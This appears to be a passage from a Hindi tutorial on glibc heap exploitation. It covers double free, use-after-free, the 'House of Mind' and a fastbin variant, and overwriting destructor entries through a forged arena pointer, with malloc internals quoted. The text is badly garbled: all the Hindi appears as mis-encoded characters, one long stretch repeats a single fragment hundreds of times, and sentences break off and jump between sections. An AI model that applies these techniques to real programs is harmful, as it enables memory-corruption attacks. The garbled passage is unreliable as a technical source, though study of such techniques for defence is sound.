рдПрдХ рдмрдлрд╝рд░ рдЬреЛ рдЗрд╕рдХреЗ рдкрд┐рдЫрд▓реЗ_рд╕рд╛рдЗрдЬрд╝ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ

рдЗрд╕ рддрд░рд╣, рджреЛ mallocs рдХреЛ рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рд░реВрдк рд╕реЗ рдФрд░ рдПрдХ рдХреЗрд╡рд▓ рдирд┐рдпрдВрддреНрд░рд┐рдд рд░реВрдк рд╕реЗ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдХреЗ рдПрдХ рдЙрддреНрдкреАрдбрд╝рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рджреЛрд╣рд░реА рдореБрдХреНрддрд┐ рд╡рдВрд╢рди**

рдпрджрд┐ рдПрдХ рд╣реА рдкреНрд╡рд╛рдЗрдВрдЯрд░ рдХреЗ рд╕рд╛рде рджреЛ рдмрд╛рд░ free() рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рджреЛ рдмрд┐рдиреНрд╕ рдПрдХ рд╣реА рдкрддреЗ рдХреА рдУрд░ рджреЗрдЦ рд░рд╣реЗ рд╣реЛрддреЗ рд╣реИрдВред

рдпрджрд┐ рдХрд┐рд╕реА рдХреЛ рдлрд┐рд░ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИ рддреЛ рдЙрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдирд┐рдпреБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЕрдЧрд░ рдХрд┐рд╕реА рдЕрдиреНрдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИ рддреЛ рдЙрд╕реЗ рдПрдХ рд╣реА рд╕реНрдерд╛рди рдирд┐рдпреБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ "fd" рдФрд░ "bk" рдХреЗ рдкреНрд╡рд╛рдЗрдВрдЯрд░реНрд╕ рдХреЛ рдЧрд▓рдд рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде рднрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ рдкрд┐рдЫрд▓реА рдЖрд░рдХреНрд╖рдг рдХреЗ рджреНрд╡рд╛рд░рд╛ рд▓рд┐рдЦрд╛ рдЬрд╛рдПрдЧрд╛ред

**рдлреНрд░реА() рдХреЗ рдмрд╛рдж**

рдПрдХ рдкрд╣рд▓реЗ рд╕реЗ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреНрд╡рд╛рдЗрдВрдЯрд░ рдмрд┐рдирд╛ рдирд┐рдпрдВрддреНрд░рдг рдХреЗ рдлрд┐рд░ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

## **8 рд╣реАрдк рдУрд╡рд░рдлрд╝реНрд▓реЛ: рдЙрдиреНрдирдд рдЙрддреНрдкреАрдбрд╝рди**

Unlink() рдФрд░ FrontLink() рддрдХрдиреАрдХреЛрдВ рдХреЛ unlink() рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдкрд░ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

**рдорд╛рдЗрдВрдб рдХрд╛ рдШрд░**

рдХреЗрд╡рд▓ рдПрдХ free() рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдХрд┐ рдХреЛрдб рдХреЛ рдЕрд░реНрдмрд┐рдЯреНрд░реЗрд░реА рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПред рдПрдХ рджреВрд╕рд░реЗ рдЯреБрдХрдбрд╝реЗ рдХреЛ рдЦреЛрдЬрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдЬреЛ рдкрд╣рд▓реЗ рджреНрд╡рд╛рд░рд╛ рдЕрдзрд┐рдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдПрдХ free() рдХреЙрд▓ рдХрд░рдиреЗ рдкрд░ public\_fREe(mem) рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ рдХрд░рддрд╛ рд╣реИ:

mstate ar\_ptr;

mchunkptr p;

тАж

p = mem2chunk(mes); тАФ> рдЯреБрдХрдбрд╝реЗ рдХреА рд╢реБрд░реБрдЖрдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкрддреЗ рдкрд░ рдкреНрд╡рд╛рдЗрдВрдЯрд░ рд▓реМрдЯрд╛рддрд╛ рд╣реИ (mem-8)

тАж

ar\_ptr = arena\_for\_chunk(p); тАФ> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

тАж

\_int\_free(ar\_ptr, mem);

}

\[1] рдореЗрдВ рдпрд╣ рджреЗрдЦрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЖрдХрд╛рд░ рдХрд╛ рдмрд┐рдЯ NON\_MAIN\_ARENA рд╣реИ, рдЬрд┐рд╕реЗ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЬрд╛рдВрдЪ рд╕рдЪ рд╣реЛ рдФрд░ heap\_for\_ptr() рдХреЛ рдЪрд▓рд╛рдП рдЬрд╛рдП рдЬреЛ "mem" рдкрд░ рдПрдХ рдФрд░ рдХрд░рддрд╛ рд╣реИ "mem" рдХреЗ 2.5 рдЕрдзрд┐рдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд╛рдЗрдЯреНрд╕ рдХреЛ 0 рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ (рд╣рдорд╛рд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ 0x0804a000 рд╕реЗ 0x08000000) рдФрд░ 0x08000000->ar\_ptr рддрдХ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ рдпрд╣ рдПрдХ struct heap\_info рд╣реИ)

рдЗрд╕ рддрд░рд╣ рдпрджрд┐ рд╣рдо рдХрд┐рд╕реА рдЯреБрдХрдбрд╝реЗ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ 0x0804a000 рдФрд░ рдПрдХ рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рд╣реЛрдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИ **0x081002a0** рд╣рдо 0x08100000 рдкрд░ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЬреЛ рдХреБрдЫ рднреА рдЪрд╛рд╣реЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **0x0804a000**ред рдЬрдм рдпрд╣ рджреВрд╕рд░рд╛ рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рд╣реЛрдЧрд╛ рддреЛ рд╡рд╣ рджреЗрдЦреЗрдЧрд╛ рдХрд┐ heap\_for\_ptr(ptr)->ar\_ptr рдЙрд╕реЗ 0x08100000 рдкрд░ рд▓рд┐рдЦрд╛ рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рдЙрд╕реЗ рдкрд╣рд▓реЗ рджреЗрдЦрд╛ рдЧрдпрд╛ рдерд╛ рдЬреЛ рд╣рдордиреЗ рджреЗрдЦрд╛ рдерд╛ рдФрд░ рдЙрд╕рдХреЗ 4 рдкрд╣рд▓реЗ рдмрд╛рдЗрдЯреЛрдВ рдХрд╛ рдореВрд▓реНрдп рдирд┐рдХрд╛рд▓рд╛ рдЧрдпрд╛ рдерд╛, ar\_ptr)

рдЗрд╕ рддрд░рд╣ \_int\_free(ar\_ptr, mem) рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЕрд░реНрдерд╛рдд **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
тАж\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

рдЬреИрд╕рд╛ рдХрд┐ рд╣рдордиреЗ рдкрд╣рд▓реЗ рджреЗрдЦрд╛ рд╣реИ, рд╣рдо av рдХреЗ рдорд╛рди рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╡рд╣ рд╣реИ рдЬрд┐рд╕реЗ рд╣рдордиреЗ рдЙрд╕ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рд▓рд┐рдЦрд╛ рд╣реИ рдЬреЛ рдореБрдХреНрдд рд╣реЛрдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИред

рдЬреИрд╕реЗ рд╣реА unsorted\_chunks рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рд╣рдо av->bins\[2] рдореЗрдВ \_\_DTOR\_END\_\_-12 рдХрд╛ рдорд╛рди рд▓рд┐рдЦрддреЗ рд╣реИрдВ рддреЛ рдЕрдВрддрд┐рдо рдирд┐рд░реНрджреЗрд╢рди рдореЗрдВ \_\_DTOR\_END\_\_ рдкрд░ рд▓рд┐рдЦрд╛ рдЬрд╛рдПрдЧрд╛ рджреВрд╕рд░реЗ рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдкрддрд╛ред

рдЕрд░реНрдерд╛рдд, рдкрд╣рд▓реЗ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рд╣рдореЗрдВ рд╢реБрд░реБ
рдпрд╣ рддрдХрдиреАрдХ рдЕрдм рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣рд╛рдБ рд▓рд┐рдВрдХ рдХреЗ рд▓рд┐рдП рд▓рдЧрднрдЧ рд╡рд╣реА рдкреИрдЪ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬреЛ рдЕрдирд▓рд┐рдВрдХ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдпрд╣ рддреБрд▓рдирд╛ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдирдП рд╕реНрдерд╛рди рдХреЗ рд╕рд╛рде рднреА рдпрд╣ рд╕рдВрджрд░реНрднрд┐рдд рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рдЙрд╕реЗ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░ рд░рд╣рд╛ рд╣реИред

**Fastbin**

рдпрд╣ рдПрдХ The house of mind рдХрд╛ рдПрдХ рднрд┐рдиреНрди рд╕рдВрд╕реНрдХрд░рдг рд╣реИред

рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реИ рдЬрд┐рд╕реЗ \_int\_free() рдлрд╝рдВрдХреНрд╢рди рдХреА рдкрд╣рд▓реА рдЬрд╛рдВрдЪ рдХреЗ рдмрд╛рдж рдкрд╣реБрдВрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИред

fb = &(av->fastbins\[fastbin\_index(size)] тАФ> рдЬреЛ fastbin\_index(sz) тАФ> (sz >> 3) - 2

тАж

p->fd = \*fb

\*fb = p

рдЗрд╕ рддрд░рд╣, рдпрджрд┐ "fb" рдореЗрдВ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕ рдкрддреЗ рдкрд░ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдЧрд╛ рдХрд┐ рдмрд╛рдЧреАрдЪрд╛ dtors рдХреЗ рдкрддреЛрдВ рдХреЗ рдкрд╛рд╕ рд╣реЛред рдЕрдзрд┐рдХ рд╕рдЯреАрдХрддрд╛ рд╕реЗ рдХрд╣реЗрдВ рддреЛ av->max\_fast рдЙрд╕ рдкрддреЗ рдкрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рд╣рдо рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред

The House of Mind рдХреЗ рд╕рд╛рде рд╣рдордиреЗ рджреЗрдЦрд╛ рдХрд┐ рд╣рдо рдПрд╡реА рдХреА рд╕реНрдерд┐рддрд┐ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рдереЗред

рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рд╣рдо рдЖрдХрд╛рд░ рдореЗрдВ 8 + NON\_MAIN\_ARENA + PREV\_INUSE рдбрд╛рд▓рддреЗ рд╣реИрдВ тАФ> fastbin\_index() рд╣рдореЗрдВ fastbins\[-1] рд╡рд╛рдкрд╕ рдХрд░реЗрдЧрд╛, рдЬреЛ av->max\_fast рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░реЗрдЧрд╛ред

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ av->max\_fast рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ (рдирд┐рд╢рд╛рдирд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдмрд▓реНрдХрд┐ рдЙрд╕ рд╕реНрдерд╛рди рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЬрд┐рд╕ рддреБрдХрдбрд╝реЗ рдХреЛ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЙрд╕рдХреЗ рд╕рдВрдЧрдд рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ 8 рд╕реЗ рдЕрдзрд┐рдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП -> рд╣рдордиреЗ рдХрд╣рд╛ рдХрд┐ рдореБрдХреНрдд рдХрд┐рдП рдЧрдП рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ 8 рд╣реИ, рдЗрд╕ рдЭреВрдареЗ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рд╣рдореЗрдВ рдХреЗрд╡рд▓ 8 рд╕реЗ рдЕрдзрд┐рдХ рдЖрдХрд╛рд░ рдбрд╛рд▓рдирд╛ рд╣реИ (рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рд╢реИрд▓рдХреЛрдб рдЗрд╕ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдкрд╣рд▓реЗ рдПрдХ рдЬреЗрдПрдордкреА рдбрд╛рд▓рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ рдирд╛рдкреНрд╕ рдореЗрдВ рдЧрд┐рд░реЗрдЧрд╛)ред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЙрд╕реА рдЭреВрдареЗ рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ av->system\_mem рд╕реЗ рдХрдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред av->system\_mem 1848 рдмрд╛рдЗрдЯ рджреВрд░ рд╣реИред

рдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдПрдирдбреАрдЯреАрдУрдЖрд░\_рдП
рджреЛ malloc рд░рд┐рдЬрд░реНрд╡ рдХрд┐рдП рдЬрд╛рдПрдВ, рддрд╛рдХрд┐ рдкрд╣рд▓реЗ рдкрд░ overflow рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬрдм рджреВрд╕рд░рд╛ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ рдФрд░ рдЙрд╕реЗ рдЙрд╕рдХреЗ bin рдореЗрдВ рдбрд╛рд▓ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ (рдЕрд░реНрдерд╛рдд, overflow рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рджреВрд╕рд░реЗ рдЯреБрдХрдбрд╝реЗ рд╕реЗ рдЕрдзрд┐рдХ malloc рд░рд┐рдЬрд░реНрд╡ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ)

рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдЪрдпрдирд┐рдд рдкрддреЗ рдкрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ malloc рд░рд┐рдЬрд░реНрд╡ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛред

